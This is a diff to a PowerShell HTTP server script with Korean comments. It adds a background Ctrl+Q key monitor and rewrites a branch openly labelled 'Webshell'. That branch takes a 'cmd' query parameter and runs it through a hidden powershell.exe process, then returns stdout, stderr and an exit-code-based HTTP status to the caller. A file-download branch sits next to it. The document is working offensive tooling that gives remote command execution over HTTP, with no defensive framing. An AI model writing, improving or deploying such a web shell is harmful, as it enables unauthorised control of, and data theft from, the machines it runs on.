@@ -32,13 +32,27 @@ try {
     exit
 }
 
-# Ctrl+Q handler
-$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
-    if ($listener -and $listener.IsListening) {
-        $listener.Stop()
-        $listener.Close()
+# Ctrl+Q 감지용 플래그
+$script:shouldStop = $false
+
+# 백그라운드에서 키 모니터링
+$keyMonitor = [PowerShell]::Create().AddScript({
+    param($stopFlag)
+    
+    while (-not $stopFlag.Value) {
+        if ([Console]::KeyAvailable) {
+            $key = [Console]::ReadKey($true)
+            if ($key.Key -eq 'Q' -and $key.Modifiers -eq 'Control') {
+                $stopFlag.Value = $true
+                Write-Host "`n[!] Ctrl+Q detected - stopping..." -ForegroundColor Yellow
+                break
+            }
+        }
+        Start-Sleep -Milliseconds 100
     }
-}
+}).AddArgument(([ref]$script:shouldStop))
+
+$keyMonitorJob = $keyMonitor.BeginInvoke()
 
 function Send-Response {
     param($Response, $Content, $ContentType = "text/html", $StatusCode = 200)
@@ -74,18 +88,19 @@ function Parse-MultipartFormData {
     return $null
 }
 
-while ($listener.IsListening) {
+while ($listener.IsListening -and -not $script:shouldStop) {
     try {
-        # Non-blocking receive with Ctrl+Q support
+        # 짧은 타임아웃으로 즉시 응답
         $contextTask = $listener.GetContextAsync()
         
-        while (-not $contextTask.AsyncWaitHandle.WaitOne(200)) {
-            if ([Console]::KeyAvailable) {
-                $key = [Console]::ReadKey($true)
-                if ($key.Key -eq 'Q' -and $key.Modifiers -eq 'Control') {
-                    throw "User interrupted"
-                }
+        while (-not $contextTask.AsyncWaitHandle.WaitOne(100)) {
+            if ($script:shouldStop) {
+                break
             }
+        }
+        
+        if ($script:shouldStop) {
+            break
         }
         
         $context = $contextTask.GetAwaiter().GetResult()
@@ -181,8 +196,46 @@ while ($listener.IsListening) {
                             $cmd = $request.QueryString["cmd"]
                             Write-Host "[!] Webshell: $cmd" -ForegroundColor Red
                             
-                            $output = powershell -Command $cmd 2>&1 | Out-String
-                            Send-Response -Response $response -Content $output -ContentType "text/plain"
+                            try {
+                                # PowerShell 프로세스로 실행 (Exit Code 캡처)
+                                $psi = New-Object System.Diagnostics.ProcessStartInfo
+                                $psi.FileName = "powershell.exe"
+                                $psi.Arguments = "-Command `"$cmd`""
+                                $psi.RedirectStandardOutput = $true
+                                $psi.RedirectStandardError = $true
+                                $psi.UseShellExecute = $false
+                                $psi.CreateNoWindow = $true
+                                
+                                $process = New-Object System.Diagnostics.Process
+                                $process.StartInfo = $psi
+                                $process.Start() | Out-Null
+                                
+                                # 출력 읽기
+                                $stdout = $process.StandardOutput.ReadToEnd()
+                                $stderr = $process.StandardError.ReadToEnd()
+                                
+                                # 프로세스 종료 대기
+                                $process.WaitForExit()
+                                $exitCode = $process.ExitCode
+                                
+                                # 출력 조합
+                                $output = $stdout
+                                if ($stderr) {
+                                    $output += "`n[STDERR]`n" + $stderr
+                                }
+                                
+                                # Exit Code로 성공/실패 판단
+                                if ($exitCode -eq 0) {
+                                    Send-Response -Response $response -Content $output -ContentType "text/plain" -StatusCode 200
+                                } else {
+                                    Write-Host "[!] Command failed with exit code $exitCode" -ForegroundColor Red
+                                    Send-Response -Response $response -Content $output -ContentType "text/plain" -StatusCode 500
+                                }
+                                
+                            } catch {
+                                Write-Host "[-] Webshell execution error: $_" -ForegroundColor Red
+                                Send-Response -Response $response -Content "EXECUTION_ERROR: $_" -ContentType "text/plain" -StatusCode 500
+                            }
                         }
                         # 파일 다운로드
                         else {
@@ -317,14 +370,19 @@ while ($listener.IsListening) {
             }
         }
     } catch {
-        if ($_.Exception.Message -eq "User interrupted") {
-            break
+        if (-not $script:shouldStop) {
+            Write-Host "[-] Error: $_" -ForegroundColor Red
         }
-        Write-Host "[-] Error: $_" -ForegroundColor Red
     }
 }
 
+# 정리
 Write-Host "`n[*] Shutting down..." -ForegroundColor Yellow
 $listener.Stop()
 $listener.Close()
+
+# 키 모니터 정리
+$keyMonitor.Stop()
+$keyMonitor.Dispose()
+
 Write-Host "[+] Server stopped" -ForegroundColor Green
